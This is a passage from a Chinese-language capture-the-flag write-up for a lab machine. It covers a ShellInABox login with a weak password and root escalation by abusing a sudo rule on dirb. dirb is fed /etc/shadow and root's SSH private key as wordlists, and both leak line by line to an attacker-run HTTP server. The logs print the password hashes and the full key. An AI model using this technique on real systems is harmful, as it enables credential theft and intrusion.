Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n' |grep bash
root:x:0:0:root:/root:/bin/bash
, cris:x:1000:1000:cris,,,:/home/cris:/bin/bash

```

Â≠òÂú®`cris`Áî®Êà∑ÔºåÊàë‰ª¨Â∞ùËØïËØªÂèñÁßÅÈí•

```bash
File to read:/home/cris/.ssh/id_rsa
NO
```

Ê≤°ÊúâÊàñËÄÖÊ≤°ÊúâÊùÉÈôêÔºåÈÇ£Êàë‰ª¨ÂéªÁúãÁúãÂÖ∂‰ªñÁ´ØÂè£

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.143:4200/
curl: (52) Empty reply from server

```

Á©∫ËøûÊé•ÔºåÊàëÂéª......

Á≠â‰ºö`12359`Á´ØÂè£ÊòØÊñá‰ª∂ËØªÂèñÔºå`21`ÊòØËæÖÂä©ÔºåÈÇ£ËøúÁ®ãËøûÊé•Á´ØÂè£Âú®Âì™Ôºü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p4200 -Pn -sV 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 16:08 CST
Nmap scan report for 192.168.205.143
Host is up (0.00034s latency).

PORT     STATE SERVICE  VERSION
4200/tcp open  ssl/http ShellInABox
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.53 seconds

```

ÂéüÊù•ÊòØÈúÄË¶Å**https**ËøûÊé•

![Image](https://github.com/user-attachments/assets/35c088b0-7083-4f33-b462-c86838925382)

Â∞ùËØï‰∏Ä‰∏ãÂº±ÂØÜÁ†Å(crisÔºöcris)

![Image](https://github.com/user-attachments/assets/5d244afd-f3a0-47cf-ac95-b516cc8734f3)

ÁåúÂØπÂíØ

# 3.ÊèêÊùÉ

```bash
cris@crack:~$ sudo -l                                                                                                                                                                        
Matching Defaults entries for cris on crack:                                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                   
                                                                                                                                                                                             
User cris may run the following commands on crack:                                                                                                                                           
    (ALL) NOPASSWD: /usr/bin/dirb                                                                                                                                                            
cris@crack:~$ ls                                                                                                                                                                             
crack.py  user.txt  ziempre.py
cris@crack:~$ cat ziempre.py                                                                                                                                                                 
#!/usr/local/lib/python3.7                                                                                                                                                                     
from subprocess import Popen                                                                                                                                                                 
import sys                                                                                                                                                                                   
program = '/home/cris/crack.py'                                                                                                                                                              
while True:                                                                                                                                                                                  
    p = Popen('python3 '+program, shell=True)                                                                                                                                                
    p.wait()                                                                                                                                                                                 
                                                                                                                                       
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /etc/shadow                                                                                                                          
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /etc/shadow                                                                                                                                                                  
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 28
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                           
DOWNLOADED: 28 - FOUND: 0                                                                                                                                                                    
```

Êé•Êî∂‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /randomfile1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /frand2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /root:$y$j9T$LVT9GIrLdk5L.xns1akJZ1$wmigJ7er07AT/VwIAuYSZ3j94LOCe8EJHC6d2mlZVo3:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /daemon:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /bin:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sys:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sync:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /games:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /man:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /lp:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /mail:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /news:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /uucp:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /proxy:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /www-data:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /backup:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /list:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /irc:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /gnats:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /nobody:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /_apt:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-network:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-resolve:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /messagebus:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-timesync:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sshd:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /cris:$y$j9T$kFXVxpRhH2ZAeDGNazqRq/$IokBR4XhhyRJOur8YOHu3fF59/0NOHC5AIsvkxXx8..:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-coredump:!*:19515:::::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /shellinabox:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /ftp:*:19515:0:99999:7::: HTTP/1.1' 404 -

```

ÊàëÂéªËøô‰πàÁã†ÔºåËá™ÂÆö‰πâÂä†ÂØÜÁÆóÊ≥ï„ÄÇÊµãËØïËØªÂèñ`.bash_history`

```bash
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.bash_history                                                                                                                  
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /root/.bash_history                                                                                                                                                          
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 0
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                           
DOWNLOADED: 0 - FOUND: 0                                                                                                                                                                     
```

ÂÜçËØïËØï`id_rsa`

```bash
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.ssh/id_rsa                                                                                                                    
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /root/.ssh/id_rsa                                                                                                                                                            
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 38
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                           
DOWNLOADED: 38 - FOUND: 0                                                                                                                                                                    
```

Êé•Êî∂

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /randomfile1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /frand2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----BEGIN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----END HTTP/1.1' 404 -

```

Êàë‰ª¨ÊèêÂèñ‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat tmp 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /randomfile1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /frand2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----BEGIN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
